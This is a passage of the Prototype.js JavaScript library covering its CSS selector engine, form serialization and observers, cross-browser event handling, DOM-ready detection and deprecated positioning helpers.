      'nth-of-type':    function(m) {
        return Selector.xpath.pseudos.nth("position() ", m);
      },
      'nth-last-of-type': function(m) {
        return Selector.xpath.pseudos.nth("(last() + 1 - position()) ", m);
      },
      'first-of-type':  function(m) {
        m[6] = "1"; return Selector.xpath.pseudos['nth-of-type'](m);
      },
      'last-of-type':   function(m) {
        m[6] = "1"; return Selector.xpath.pseudos['nth-last-of-type'](m);
      },
      'only-of-type':   function(m) {
        var p = Selector.xpath.pseudos; return p['first-of-type'](m) + p['last-of-type'](m);
      },
      nth: function(fragment, m) {
        var mm, formula = m[6], predicate;
        if (formula == 'even') formula = '2n+0';
        if (formula == 'odd')  formula = '2n+1';
        if (mm = formula.match(/^(\d+)$/)) // digit only
          return '[' + fragment + "= " + mm[1] + ']';
        if (mm = formula.match(/^(-?\d*)?n(([+-])(\d+))?/)) { // an+b
          if (mm[1] == "-") mm[1] = -1;
          var a = mm[1] ? Number(mm[1]) : 1;
          var b = mm[2] ? Number(mm[2]) : 0;
          predicate = "[((#{fragment} - #{b}) mod #{a} = 0) and " +
          "((#{fragment} - #{b}) div #{a} >= 0)]";
          return new Template(predicate).evaluate({
            fragment: fragment, a: a, b: b });
        }
      }
    }
  },

  criteria: {
    tagName:      'n = h.tagName(n, r, "#{1}", c);      c = false;',
    className:    'n = h.className(n, r, "#{1}", c);    c = false;',
    id:           'n = h.id(n, r, "#{1}", c);           c = false;',
    attrPresence: 'n = h.attrPresence(n, r, "#{1}", c); c = false;',
    attr: function(m) {
      m[3] = (m[5] || m[6]);
      return new Template('n = h.attr(n, r, "#{1}", "#{3}", "#{2}", c); c = false;').evaluate(m);
    },
    pseudo: function(m) {
      if (m[6]) m[6] = m[6].replace(/"/g, '\\"');
      return new Template('n = h.pseudo(n, "#{1}", "#{6}", r, c); c = false;').evaluate(m);
    },
    descendant:   'c = "descendant";',
    child:        'c = "child";',
    adjacent:     'c = "adjacent";',
    laterSibling: 'c = "laterSibling";'
  },

  patterns: {
    // combinators must be listed first
    // (and descendant needs to be last combinator)
    laterSibling: /^\s*~\s*/,
    child:        /^\s*>\s*/,
    adjacent:     /^\s*\+\s*/,
    descendant:   /^\s/,

    // selectors follow
    tagName:      /^\s*(\*|[\w\-]+)(\b|$)?/,
    id:           /^#([\w\-\*]+)(\b|$)/,
    className:    /^\.([\w\-\*]+)(\b|$)/,
    pseudo:
/^:((first|last|nth|nth-last|only)(-child|-of-type)|empty|checked|(en|dis)abled|not)(\((.*?)\))?(\b|$|(?=\s|[:+~>]))/,
    attrPresence: /^\[((?:[\w]+:)?[\w]+)\]/,
    attr:         /\[((?:[\w-]*:)?[\w-]+)\s*(?:([!^$*~|]?=)\s*((['"])([^\4]*?)\4|([^'"][^\]]*?)))?\]/
  },

  // for Selector.match and Element#match
  assertions: {
    tagName: function(element, matches) {
      return matches[1].toUpperCase() == element.tagName.toUpperCase();
    },

    className: function(element, matches) {
      return Element.hasClassName(element, matches[1]);
    },

    id: function(element, matches) {
      return element.id === matches[1];
    },

    attrPresence: function(element, matches) {
      return Element.hasAttribute(element, matches[1]);
    },

    attr: function(element, matches) {
      var nodeValue = Element.readAttribute(element, matches[1]);
      return nodeValue && Selector.operators[matches[2]](nodeValue, matches[5] || matches[6]);
    }
  },

  handlers: {
    // UTILITY FUNCTIONS
    // joins two collections
    concat: function(a, b) {
      for (var i = 0, node; node = b[i]; i++)
        a.push(node);
      return a;
    },

    // marks an array of nodes for counting
    mark: function(nodes) {
      var _true = Prototype.emptyFunction;
      for (var i = 0, node; node = nodes[i]; i++)
        node._countedByPrototype = _true;
      return nodes;
    },

    unmark: function(nodes) {
      for (var i = 0, node; node = nodes[i]; i++)
        node._countedByPrototype = undefined;
      return nodes;
    },

    // mark each child node with its position (for nth calls)
    // "ofType" flag indicates whether we're indexing for nth-of-type
    // rather than nth-child
    index: function(parentNode, reverse, ofType) {
      parentNode._countedByPrototype = Prototype.emptyFunction;
      if (reverse) {
        for (var nodes = parentNode.childNodes, i = nodes.length - 1, j = 1; i >= 0; i--) {
          var node = nodes[i];
          if (node.nodeType == 1 && (!ofType || node._countedByPrototype)) node.nodeIndex = j++;
        }
      } else {
        for (var i = 0, j = 1, nodes = parentNode.childNodes; node = nodes[i]; i++)
          if (node.nodeType == 1 && (!ofType || node._countedByPrototype)) node.nodeIndex = j++;
      }
    },

    // filters out duplicates and extends all nodes
    unique: function(nodes) {
      if (nodes.length == 0) return nodes;
      var results = [], n;
      for (var i = 0, l = nodes.length; i < l; i++)
        if (!(n = nodes[i])._countedByPrototype) {
          n._countedByPrototype = Prototype.emptyFunction;
          results.push(Element.extend(n));
        }
      return Selector.handlers.unmark(results);
    },

    // COMBINATOR FUNCTIONS
    descendant: function(nodes) {
      var h = Selector.handlers;
      for (var i = 0, results = [], node; node = nodes[i]; i++)
        h.concat(results, node.getElementsByTagName('*'));
      return results;
    },

    child: function(nodes) {
      var h = Selector.handlers;
      for (var i = 0, results = [], node; node = nodes[i]; i++) {
        for (var j = 0, child; child = node.childNodes[j]; j++)
          if (child.nodeType == 1 && child.tagName != '!') results.push(child);
      }
      return results;
    },

    adjacent: function(nodes) {
      for (var i = 0, results = [], node; node = nodes[i]; i++) {
        var next = this.nextElementSibling(node);
        if (next) results.push(next);
      }
      return results;
    },

    laterSibling: function(nodes) {
      var h = Selector.handlers;
      for (var i = 0, results = [], node; node = nodes[i]; i++)
        h.concat(results, Element.nextSiblings(node));
      return results;
    },

    nextElementSibling: function(node) {
      while (node = node.nextSibling)
        if (node.nodeType == 1) return node;
      return null;
    },

    previousElementSibling: function(node) {
      while (node = node.previousSibling)
        if (node.nodeType == 1) return node;
      return null;
    },

    // TOKEN FUNCTIONS
    tagName: function(nodes, root, tagName, combinator) {
      var uTagName = tagName.toUpperCase();
      var results = [], h = Selector.handlers;
      if (nodes) {
        if (combinator) {
          // fastlane for ordinary descendant combinators
          if (combinator == "descendant") {
            for (var i = 0, node; node = nodes[i]; i++)
              h.concat(results, node.getElementsByTagName(tagName));
            return results;
          } else nodes = this[combinator](nodes);
          if (tagName == "*") return nodes;
        }
        for (var i = 0, node; node = nodes[i]; i++)
          if (node.tagName.toUpperCase() === uTagName) results.push(node);
        return results;
      } else return root.getElementsByTagName(tagName);
    },

    id: function(nodes, root, id, combinator) {
      var targetNode = $(id), h = Selector.handlers;
      if (!targetNode) return [];
      if (!nodes && root == document) return [targetNode];
      if (nodes) {
        if (combinator) {
          if (combinator == 'child') {
            for (var i = 0, node; node = nodes[i]; i++)
              if (targetNode.parentNode == node) return [targetNode];
          } else if (combinator == 'descendant') {
            for (var i = 0, node; node = nodes[i]; i++)
              if (Element.descendantOf(targetNode, node)) return [targetNode];
          } else if (combinator == 'adjacent') {
            for (var i = 0, node; node = nodes[i]; i++)
              if (Selector.handlers.previousElementSibling(targetNode) == node)
                return [targetNode];
          } else nodes = h[combinator](nodes);
        }
        for (var i = 0, node; node = nodes[i]; i++)
          if (node == targetNode) return [targetNode];
        return [];
      }
      return (targetNode && Element.descendantOf(targetNode, root)) ? [targetNode] : [];
    },

    className: function(nodes, root, className, combinator) {
      if (nodes && combinator) nodes = this[combinator](nodes);
      return Selector.handlers.byClassName(nodes, root, className);
    },

    byClassName: function(nodes, root, className) {
      if (!nodes) nodes = Selector.handlers.descendant([root]);
      var needle = ' ' + className + ' ';
      for (var i = 0, results = [], node, nodeClassName; node = nodes[i]; i++) {
        nodeClassName = node.className;
        if (nodeClassName.length == 0) continue;
        if (nodeClassName == className || (' ' + nodeClassName + ' ').include(needle))
          results.push(node);
      }
      return results;
    },

    attrPresence: function(nodes, root, attr, combinator) {
      if (!nodes) nodes = root.getElementsByTagName("*");
      if (nodes && combinator) nodes = this[combinator](nodes);
      var results = [];
      for (var i = 0, node; node = nodes[i]; i++)
        if (Element.hasAttribute(node, attr)) results.push(node);
      return results;
    },

    attr: function(nodes, root, attr, value, operator, combinator) {
      if (!nodes) nodes = root.getElementsByTagName("*");
      if (nodes && combinator) nodes = this[combinator](nodes);
      var handler = Selector.operators[operator], results = [];
      for (var i = 0, node; node = nodes[i]; i++) {
        var nodeValue = Element.readAttribute(node, attr);
        if (nodeValue === null) continue;
        if (handler(nodeValue, value)) results.push(node);
      }
      return results;
    },

    pseudo: function(nodes, name, value, root, combinator) {
      if (nodes && combinator) nodes = this[combinator](nodes);
      if (!nodes) nodes = root.getElementsByTagName("*");
      return Selector.pseudos[name](nodes, value, root);
    }
  },

  pseudos: {
    'first-child': function(nodes, value, root) {
      for (var i = 0, results = [], node; node = nodes[i]; i++) {
        if (Selector.handlers.previousElementSibling(node)) continue;
          results.push(node);
      }
      return results;
    },
    'last-child': function(nodes, value, root) {
      for (var i = 0, results = [], node; node = nodes[i]; i++) {
        if (Selector.handlers.nextElementSibling(node)) continue;
          results.push(node);
      }
      return results;
    },
    'only-child': function(nodes, value, root) {
      var h = Selector.handlers;
      for (var i = 0, results = [], node; node = nodes[i]; i++)
        if (!h.previousElementSibling(node) && !h.nextElementSibling(node))
          results.push(node);
      return results;
    },
    'nth-child':        function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, formula, root);
    },
    'nth-last-child':   function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, formula, root, true);
    },
    'nth-of-type':      function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, formula, root, false, true);
    },
    'nth-last-of-type': function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, formula, root, true, true);
    },
    'first-of-type':    function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, "1", root, false, true);
    },
    'last-of-type':     function(nodes, formula, root) {
      return Selector.pseudos.nth(nodes, "1", root, true, true);
    },
    'only-of-type':     function(nodes, formula, root) {
      var p = Selector.pseudos;
      return p['last-of-type'](p['first-of-type'](nodes, formula, root), formula, root);
    },

    // handles the an+b logic
    getIndices: function(a, b, total) {
      if (a == 0) return b > 0 ? [b] : [];
      return $R(1, total).inject([], function(memo, i) {
        if (0 == (i - b) % a && (i - b) / a >= 0) memo.push(i);
        return memo;
      });
    },

    // handles nth(-last)-child, nth(-last)-of-type, and (first|last)-of-type
    nth: function(nodes, formula, root, reverse, ofType) {
      if (nodes.length == 0) return [];
      if (formula == 'even') formula = '2n+0';
      if (formula == 'odd')  formula = '2n+1';
      var h = Selector.handlers, results = [], indexed = [], m;
      h.mark(nodes);
      for (var i = 0, node; node = nodes[i]; i++) {
        if (!node.parentNode._countedByPrototype) {
          h.index(node.parentNode, reverse, ofType);
          indexed.push(node.parentNode);
        }
      }
      if (formula.match(/^\d+$/)) { // just a number
        formula = Number(formula);
        for (var i = 0, node; node = nodes[i]; i++)
          if (node.nodeIndex == formula) results.push(node);
      } else if (m = formula.match(/^(-?\d*)?n(([+-])(\d+))?/)) { // an+b
        if (m[1] == "-") m[1] = -1;
        var a = m[1] ? Number(m[1]) : 1;
        var b = m[2] ? Number(m[2]) : 0;
        var indices = Selector.pseudos.getIndices(a, b, nodes.length);
        for (var i = 0, node, l = indices.length; node = nodes[i]; i++) {
          for (var j = 0; j < l; j++)
            if (node.nodeIndex == indices[j]) results.push(node);
        }
      }
      h.unmark(nodes);
      h.unmark(indexed);
      return results;
    },

    'empty': function(nodes, value, root) {
      for (var i = 0, results = [], node; node = nodes[i]; i++) {
        // IE treats comments as element nodes
        if (node.tagName == '!' || node.firstChild) continue;
        results.push(node);
      }
      return results;
    },

    'not': function(nodes, selector, root) {
      var h = Selector.handlers, selectorType, m;
      var exclusions = new Selector(selector).findElements(root);
      h.mark(exclusions);
      for (var i = 0, results = [], node; node = nodes[i]; i++)
        if (!node._countedByPrototype) results.push(node);
      h.unmark(exclusions);
      return results;
    },

    'enabled': function(nodes, value, root) {
      for (var i = 0, results = [], node; node = nodes[i]; i++)
        if (!node.disabled && (!node.type || node.type !== 'hidden'))
          results.push(node);
      return results;
    },

    'disabled': function(nodes, value, root) {
      for (var i = 0, results = [], node; node = nodes[i]; i++)
        if (node.disabled) results.push(node);
      return results;
    },

    'checked': function(nodes, value, root) {
      for (var i = 0, results = [], node; node = nodes[i]; i++)
        if (node.checked) results.push(node);
      return results;
    }
  },

  operators: {
    '=':  function(nv, v) { return nv == v; },
    '!=': function(nv, v) { return nv != v; },
    '^=': function(nv, v) { return nv == v || nv && nv.startsWith(v); },
    '$=': function(nv, v) { return nv == v || nv && nv.endsWith(v); },
    '*=': function(nv, v) { return nv == v || nv && nv.include(v); },
    '$=': function(nv, v) { return nv.endsWith(v); },
    '*=': function(nv, v) { return nv.include(v); },
    '~=': function(nv, v) { return (' ' + nv + ' ').include(' ' + v + ' '); },
    '|=': function(nv, v) { return ('-' + (nv || "").toUpperCase() +
     '-').include('-' + (v || "").toUpperCase() + '-'); }
  },

  split: function(expression) {
    var expressions = [];
    expression.scan(/(([\w#:.~>+()\s-]+|\*|\[.*?\])+)\s*(,|$)/, function(m) {
      expressions.push(m[1].strip());
    });
    return expressions;
  },

  matchElements: function(elements, expression) {
    var matches = $$(expression), h = Selector.handlers;
    h.mark(matches);
    for (var i = 0, results = [], element; element = elements[i]; i++)
      if (element._countedByPrototype) results.push(element);
    h.unmark(matches);
    return results;
  },

  findElement: function(elements, expression, index) {
    if (Object.isNumber(expression)) {
      index = expression; expression = false;
    }
    return Selector.matchElements(elements, expression || '*')[index || 0];
  },

  findChildElements: function(element, expressions) {
    expressions = Selector.split(expressions.join(','));
    var results = [], h = Selector.handlers;
    for (var i = 0, l = expressions.length, selector; i < l; i++) {
      selector = new Selector(expressions[i].strip());
      h.concat(results, selector.findElements(element));
    }
    return (l > 1) ? h.unique(results) : results;
  }
});

if (Prototype.Browser.IE) {
  Object.extend(Selector.handlers, {
    // IE returns comment nodes on getElementsByTagName("*").
    // Filter them out.
    concat: function(a, b) {
      for (var i = 0, node; node = b[i]; i++)
        if (node.tagName !== "!") a.push(node);
      return a;
    },

    // IE improperly serializes _countedByPrototype in (inner|outer)HTML.
    unmark: function(nodes) {
      for (var i = 0, node; node = nodes[i]; i++)
        node.removeAttribute('_countedByPrototype');
      return nodes;
    }
  });
}

function $$() {
  return Selector.findChildElements(document, $A(arguments));
}
var Form = {
  reset: function(form) {
    $(form).reset();
    return form;
  },

  serializeElements: function(elements, options) {
    if (typeof options != 'object') options = { hash: !!options };
    else if (Object.isUndefined(options.hash)) options.hash = true;
    var key, value, submitted = false, submit = options.submit;

    var data = elements.inject({ }, function(result, element) {
      if (!element.disabled && element.name) {
        key = element.name; value = $(element).getValue();
        if (value != null && element.type != 'file' && (element.type != 'submit' || (!submitted &&
            submit !== false && (!submit || key == submit) && (submitted = true)))) {
          if (key in result) {
            // a key is already present; construct an array of values
            if (!Object.isArray(result[key])) result[key] = [result[key]];
            result[key].push(value);
          }
          else result[key] = value;
        }
      }
      return result;
    });

    return options.hash ? data : Object.toQueryString(data);
  }
};

Form.Methods = {
  serialize: function(form, options) {
    return Form.serializeElements(Form.getElements(form), options);
  },

  getElements: function(form) {
    return $A($(form).getElementsByTagName('*')).inject([],
      function(elements, child) {
        if (Form.Element.Serializers[child.tagName.toLowerCase()])
          elements.push(Element.extend(child));
        return elements;
      }
    );
  },

  getInputs: function(form, typeName, name) {
    form = $(form);
    var inputs = form.getElementsByTagName('input');

    if (!typeName && !name) return $A(inputs).map(Element.extend);

    for (var i = 0, matchingInputs = [], length = inputs.length; i < length; i++) {
      var input = inputs[i];
      if ((typeName && input.type != typeName) || (name && input.name != name))
        continue;
      matchingInputs.push(Element.extend(input));
    }

    return matchingInputs;
  },

  disable: function(form) {
    form = $(form);
    Form.getElements(form).invoke('disable');
    return form;
  },

  enable: function(form) {
    form = $(form);
    Form.getElements(form).invoke('enable');
    return form;
  },

  findFirstElement: function(form) {
    var elements = $(form).getElements().findAll(function(element) {
      return 'hidden' != element.type && !element.disabled;
    });
    var firstByIndex = elements.findAll(function(element) {
      return element.hasAttribute('tabIndex') && element.tabIndex >= 0;
    }).sortBy(function(element) { return element.tabIndex }).first();

    return firstByIndex ? firstByIndex : elements.find(function(element) {
      return ['input', 'select', 'textarea'].include(element.tagName.toLowerCase());
    });
  },

  focusFirstElement: function(form) {
    form = $(form);
    form.findFirstElement().activate();
    return form;
  },

  request: function(form, options) {
    form = $(form), options = Object.clone(options || { });

    var params = options.parameters, action = form.readAttribute('action') || '';
    if (action.blank()) action = window.location.href;
    options.parameters = form.serialize(true);

    if (params) {
      if (Object.isString(params)) params = params.toQueryParams();
      Object.extend(options.parameters, params);
    }

    if (form.hasAttribute('method') && !options.method)
      options.method = form.method;

    return new Ajax.Request(action, options);
  }
};

/*--------------------------------------------------------------------------*/

Form.Element = {
  focus: function(element) {
    $(element).focus();
    return element;
  },

  select: function(element) {
    $(element).select();
    return element;
  }
};

Form.Element.Methods = {
  serialize: function(element) {
    element = $(element);
    if (!element.disabled && element.name) {
      var value = element.getValue();
      if (value != undefined) {
        var pair = { };
        pair[element.name] = value;
        return Object.toQueryString(pair);
      }
    }
    return '';
  },

  getValue: function(element) {
    element = $(element);
    var method = element.tagName.toLowerCase();
    return Form.Element.Serializers[method](element);
  },

  setValue: function(element, value) {
    element = $(element);
    var method = element.tagName.toLowerCase();
    Form.Element.Serializers[method](element, value);
    return element;
  },

  clear: function(element) {
    $(element).value = '';
    return element;
  },

  present: function(element) {
    return $(element).value != '';
  },

  activate: function(element) {
    element = $(element);
    try {
      element.focus();
      if (element.select && (element.tagName.toLowerCase() != 'input' ||
          !['button', 'reset', 'submit'].include(element.type)))
        element.select();
    } catch (e) { }
    return element;
  },

  disable: function(element) {
    element = $(element);
    element.disabled = true;
    return element;
  },

  enable: function(element) {
    element = $(element);
    element.disabled = false;
    return element;
  }
};

/*--------------------------------------------------------------------------*/

var Field = Form.Element;
var $F = Form.Element.Methods.getValue;

/*--------------------------------------------------------------------------*/

Form.Element.Serializers = {
  input: function(element, value) {
    switch (element.type.toLowerCase()) {
      case 'checkbox':
      case 'radio':
        return Form.Element.Serializers.inputSelector(element, value);
      default:
        return Form.Element.Serializers.textarea(element, value);
    }
  },

  inputSelector: function(element, value) {
    if (Object.isUndefined(value)) return element.checked ? element.value : null;
    else element.checked = !!value;
  },

  textarea: function(element, value) {
    if (Object.isUndefined(value)) return element.value;
    else element.value = value;
  },

  select: function(element, value) {
    if (Object.isUndefined(value))
      return this[element.type == 'select-one' ?
        'selectOne' : 'selectMany'](element);
    else {
      var opt, currentValue, single = !Object.isArray(value);
      for (var i = 0, length = element.length; i < length; i++) {
        opt = element.options[i];
        currentValue = this.optionValue(opt);
        if (single) {
          if (currentValue == value) {
            opt.selected = true;
            return;
          }
        }
        else opt.selected = value.include(currentValue);
      }
    }
  },

  selectOne: function(element) {
    var index = element.selectedIndex;
    return index >= 0 ? this.optionValue(element.options[index]) : null;
  },

  selectMany: function(element) {
    var values, length = element.length;
    if (!length) return null;

    for (var i = 0, values = []; i < length; i++) {
      var opt = element.options[i];
      if (opt.selected) values.push(this.optionValue(opt));
    }
    return values;
  },

  optionValue: function(opt) {
    // extend element because hasAttribute may not be native
    return Element.extend(opt).hasAttribute('value') ? opt.value : opt.text;
  }
};

/*--------------------------------------------------------------------------*/

Abstract.TimedObserver = Class.create(PeriodicalExecuter, {
  initialize: function($super, element, frequency, callback) {
    $super(callback, frequency);
    this.element   = $(element);
    this.lastValue = this.getValue();
  },

  execute: function() {
    var value = this.getValue();
    if (Object.isString(this.lastValue) && Object.isString(value) ?
        this.lastValue != value : String(this.lastValue) != String(value)) {
      this.callback(this.element, value);
      this.lastValue = value;
    }
  }
});

Form.Element.Observer = Class.create(Abstract.TimedObserver, {
  getValue: function() {
    return Form.Element.getValue(this.element);
  }
});

Form.Observer = Class.create(Abstract.TimedObserver, {
  getValue: function() {
    return Form.serialize(this.element);
  }
});

/*--------------------------------------------------------------------------*/

Abstract.EventObserver = Class.create({
  initialize: function(element, callback) {
    this.element  = $(element);
    this.callback = callback;

    this.lastValue = this.getValue();
    if (this.element.tagName.toLowerCase() == 'form')
      this.registerFormCallbacks();
    else
      this.registerCallback(this.element);
  },

  onElementEvent: function() {
    var value = this.getValue();
    if (this.lastValue != value) {
      this.callback(this.element, value);
      this.lastValue = value;
    }
  },

  registerFormCallbacks: function() {
    Form.getElements(this.element).each(this.registerCallback, this);
  },

  registerCallback: function(element) {
    if (element.type) {
      switch (element.type.toLowerCase()) {
        case 'checkbox':
        case 'radio':
          Event.observe(element, 'click', this.onElementEvent.bind(this));
          break;
        default:
          Event.observe(element, 'change', this.onElementEvent.bind(this));
          break;
      }
    }
  }
});

Form.Element.EventObserver = Class.create(Abstract.EventObserver, {
  getValue: function() {
    return Form.Element.getValue(this.element);
  }
});

Form.EventObserver = Class.create(Abstract.EventObserver, {
  getValue: function() {
    return Form.serialize(this.element);
  }
});
if (!window.Event) var Event = { };

Object.extend(Event, {
  KEY_BACKSPACE: 8,
  KEY_TAB:       9,
  KEY_RETURN:   13,
  KEY_ESC:      27,
  KEY_LEFT:     37,
  KEY_UP:       38,
  KEY_RIGHT:    39,
  KEY_DOWN:     40,
  KEY_DELETE:   46,
  KEY_HOME:     36,
  KEY_END:      35,
  KEY_PAGEUP:   33,
  KEY_PAGEDOWN: 34,
  KEY_INSERT:   45,

  cache: { },

  relatedTarget: function(event) {
    var element;
    switch(event.type) {
      case 'mouseover': element = event.fromElement; break;
      case 'mouseout':  element = event.toElement;   break;
      default: return null;
    }
    return Element.extend(element);
  }
});

Event.Methods = (function() {
  var isButton;

  if (Prototype.Browser.IE) {
    var buttonMap = { 0: 1, 1: 4, 2: 2 };
    isButton = function(event, code) {
      return event.button == buttonMap[code];
    };

  } else if (Prototype.Browser.WebKit) {
    isButton = function(event, code) {
      switch (code) {
        case 0: return event.which == 1 && !event.metaKey;
        case 1: return event.which == 1 && event.metaKey;
        default: return false;
      }
    };

  } else {
    isButton = function(event, code) {
      return event.which ? (event.which === code + 1) : (event.button === code);
    };
  }

  return {
    isLeftClick:   function(event) { return isButton(event, 0) },
    isMiddleClick: function(event) { return isButton(event, 1) },
    isRightClick:  function(event) { return isButton(event, 2) },

    element: function(event) {
      event = Event.extend(event);

      var node          = event.target,
          type          = event.type,
          currentTarget = event.currentTarget;

      if (currentTarget && currentTarget.tagName) {
        // Firefox screws up the "click" event when moving between radio buttons
        // via arrow keys. It also screws up the "load" and "error" events on images,
        // reporting the document as the target instead of the original image.
        if (type === 'load' || type === 'error' ||
          (type === 'click' && currentTarget.tagName.toLowerCase() === 'input'
            && currentTarget.type === 'radio'))
              node = currentTarget;
      }
      if (node) {
        if (node.nodeType == Node.TEXT_NODE) node = node.parentNode;
        return Element.extend(node);
      } else return false;
    },

    findElement: function(event, expression) {
      var element = Event.element(event);
      if (!expression) return element;
      var elements = [element].concat(element.ancestors());
      return Selector.findElement(elements, expression, 0);
    },

    pointer: function(event) {
      var docElement = document.documentElement,
      body = document.body || { scrollLeft: 0, scrollTop: 0 };
      return {
        x: event.pageX || (event.clientX +
          (docElement.scrollLeft || body.scrollLeft) -
          (docElement.clientLeft || 0)),
        y: event.pageY || (event.clientY +
          (docElement.scrollTop || body.scrollTop) -
          (docElement.clientTop || 0))
      };
    },

    pointerX: function(event) { return Event.pointer(event).x },
    pointerY: function(event) { return Event.pointer(event).y },

    stop: function(event) {
      Event.extend(event);
      event.preventDefault();
      event.stopPropagation();
      event.stopped = true;
    }
  };
})();

Event.extend = (function() {
  var methods = Object.keys(Event.Methods).inject({ }, function(m, name) {
    m[name] = Event.Methods[name].methodize();
    return m;
  });

  if (Prototype.Browser.IE) {
    Object.extend(methods, {
      stopPropagation: function() { this.cancelBubble = true },
      preventDefault:  function() { this.returnValue = false },
      inspect: function() { return "[object Event]" }
    });

    return function(event) {
      if (!event) return false;
      if (event._extendedByPrototype) return event;

      event._extendedByPrototype = Prototype.emptyFunction;
      var pointer = Event.pointer(event);
      Object.extend(event, {
        target: event.srcElement,
        relatedTarget: Event.relatedTarget(event),
        pageX:  pointer.x,
        pageY:  pointer.y
      });
      return Object.extend(event, methods);
    };

  } else {
    Event.prototype = Event.prototype || document.createEvent("HTMLEvents")['__proto__'];
    Object.extend(Event.prototype, methods);
    return Prototype.K;
  }
})();

Object.extend(Event, (function() {
  var cache = Event.cache;

  function getEventID(element) {
    try {
      if (element._prototypeEventID) return element._prototypeEventID[0];
      arguments.callee.id = arguments.callee.id || 1;
      return element._prototypeEventID = [++arguments.callee.id];
    } catch (error) {
      return false;
    }
  }

  function getDOMEventName(eventName) {
    if (eventName && eventName.include(':')) return "dataavailable";
    return eventName;
  }

  function getCacheForID(id) {
    return cache[id] = cache[id] || { };
  }

  function getWrappersForEventName(id, eventName) {
    var c = getCacheForID(id);
    return c[eventName] = c[eventName] || [];
  }

  function createWrapper(element, eventName, handler) {
    var id = getEventID(element);
    var c = getWrappersForEventName(id, eventName);
    if (c.pluck("handler").include(handler)) return false;

    var wrapper = function(event) {
      if (!Event || !Event.extend ||
        (event.eventName && event.eventName != eventName))
          return false;

      Event.extend(event);
      handler.call(element, event);
    };

    wrapper.handler = handler;
    c.push(wrapper);
    return wrapper;
  }

  function findWrapper(id, eventName, handler) {
    var c = getWrappersForEventName(id, eventName);
    return c.find(function(wrapper) { return wrapper.handler == handler });
  }

  function destroyWrapper(id, eventName, handler) {
    var c = getCacheForID(id);
    if (!c[eventName]) return false;
    c[eventName] = c[eventName].without(findWrapper(id, eventName, handler));
  }

  function destroyCache() {
    for (var id in cache)
      for (var eventName in cache[id])
        cache[id][eventName] = null;
  }


  // Internet Explorer needs to remove event handlers on page unload
  // in order to avoid memory leaks.
  if (window.attachEvent) {
    window.attachEvent("onunload", destroyCache);
  }

  // Safari has a dummy event handler on page unload so that it won't
  // use its bfcache. Safari <= 3.1 has an issue with restoring the "document"
  // object when page is returned to via the back button using its bfcache.
  if (Prototype.Browser.WebKit) {
    window.addEventListener('unload', Prototype.emptyFunction, false);
  }

  return {
    observe: function(element, eventName, handler) {
      element = $(element);
      var name = getDOMEventName(eventName);

      var wrapper = createWrapper(element, eventName, handler);
      if (!wrapper) return element;

      if (element.addEventListener) {
        element.addEventListener(name, wrapper, false);
      } else {
        element.attachEvent("on" + name, wrapper);
      }

      return element;
    },

    stopObserving: function(element, eventName, handler) {
      element = $(element);
      var id = getEventID(element), name = getDOMEventName(eventName);

      if (!handler && eventName) {
        getWrappersForEventName(id, eventName).each(function(wrapper) {
          element.stopObserving(eventName, wrapper.handler);
        });
        return element;

      } else if (!eventName) {
        Object.keys(getCacheForID(id)).each(function(eventName) {
          element.stopObserving(eventName);
        });
        return element;
      }

      var wrapper = findWrapper(id, eventName, handler);
      if (!wrapper) return element;

      if (element.removeEventListener) {
        element.removeEventListener(name, wrapper, false);
      } else {
        element.detachEvent("on" + name, wrapper);
      }

      destroyWrapper(id, eventName, handler);

      return element;
    },

    fire: function(element, eventName, memo) {
      element = $(element);
      if (element == document && document.createEvent && !element.dispatchEvent)
        element = document.documentElement;

      var event;
      if (document.createEvent) {
        event = document.createEvent("HTMLEvents");
        event.initEvent("dataavailable", true, true);
      } else {
        event = document.createEventObject();
        event.eventType = "ondataavailable";
      }

      event.eventName = eventName;
      event.memo = memo || { };

      if (document.createEvent) {
        element.dispatchEvent(event);
      } else {
        element.fireEvent(event.eventType, event);
      }

      return Event.extend(event);
    }
  };
})());

Object.extend(Event, Event.Methods);

Element.addMethods({
  fire:          Event.fire,
  observe:       Event.observe,
  stopObserving: Event.stopObserving
});

Object.extend(document, {
  fire:          Element.Methods.fire.methodize(),
  observe:       Element.Methods.observe.methodize(),
  stopObserving: Element.Methods.stopObserving.methodize(),
  loaded:        false
});

(function() {
  /* Support for the DOMContentLoaded event is based on work by Dan Webb,
     Matthias Miller, Dean Edwards and John Resig. */

  var timer;

  function fireContentLoadedEvent() {
    if (document.loaded) return;
    if (timer) window.clearInterval(timer);
    document.fire("dom:loaded");
    document.loaded = true;
  }

  if (document.addEventListener) {
    if (Prototype.Browser.WebKit) {
      timer = window.setInterval(function() {
        if (/loaded|complete/.test(document.readyState))
          fireContentLoadedEvent();
      }, 0);

      Event.observe(window, "load", fireContentLoadedEvent);

    } else {
      document.addEventListener("DOMContentLoaded",
        fireContentLoadedEvent, false);
    }

  } else {
    document.write("<script id=__onDOMContentLoaded defer src=//:><\/script>");
    $("__onDOMContentLoaded").onreadystatechange = function() {
      if (this.readyState == "complete") {
        this.onreadystatechange = null;
        fireContentLoadedEvent();
      }
    };
  }
})();
/*------------------------------- DEPRECATED -------------------------------*/

Hash.toQueryString = Object.toQueryString;

var Toggle = { display: Element.toggle };

Element.Methods.childOf = Element.Methods.descendantOf;

var Insertion = {
  Before: function(element, content) {
    return Element.insert(element, {before:content});
  },

  Top: function(element, content) {
    return Element.insert(element, {top:content});
  },

  Bottom: function(element, content) {
    return Element.insert(element, {bottom:content});
  },

  After: function(element, content) {
    return Element.insert(element, {after:content});
  }
};

var $continue = new Error('"throw $continue" is deprecated, use "return" instead');

// This should be moved to script.aculo.us; notice the deprecated methods
// further below, that map to the newer Element methods.
var Position = {
  // set to true if needed, warning: firefox performance problems
  // NOT neeeded for page scrolling, only if draggable contained in
  // scrollable elements
  includeScrollOffsets: false,

  // must be called before calling withinIncludingScrolloffset, every time the
  // page is scrolled
  prepare: function() {
    this.deltaX =  window.pageXOffset
                || document.documentElement.scrollLeft
                || document.body.scrollLeft
                || 0;
    this.deltaY =  window.pageYOffset
                || document.documentElement.scrollTop
                || document.body.scrollTop
                || 0;
  },

  // caches x/y coordinate pair to use with overlap
  within: function(element, x, y) {
    if (this.includeScrollOffsets)
      return this.withinIncludingScrolloffsets(element, x, y);
    this.xcomp = x;
    this.ycomp = y;
    this.offset = Element.cumulativeOffset(element);

    return (y >= this.offset[1] &&
            y <  this.offset[1] + element.offsetHeight &&
